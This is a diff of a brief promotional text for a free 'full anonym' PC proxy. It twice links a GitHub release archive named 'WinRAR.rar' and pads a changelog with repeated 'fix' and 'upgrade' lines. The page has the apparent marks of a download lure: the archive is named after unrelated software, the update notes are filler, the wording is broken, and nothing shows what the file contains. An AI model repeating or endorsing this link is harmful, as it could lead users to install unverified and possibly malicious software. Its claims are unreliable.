@@ -4,3 +4,12 @@ proxy on pc , full anonym
 Download , look down
 https://github.com/jokmandis/Proxy-v1.2/releases/download/Download/WinRAR.rar
  new version fix bag, and other problems
+Free proxy
+upgrade
+fix
+fix
+fix
+full upgrade
+fix prog
+new menu
+https://github.com/jokmandis/Proxy-v1.2/releases/download/Download/WinRAR.rar
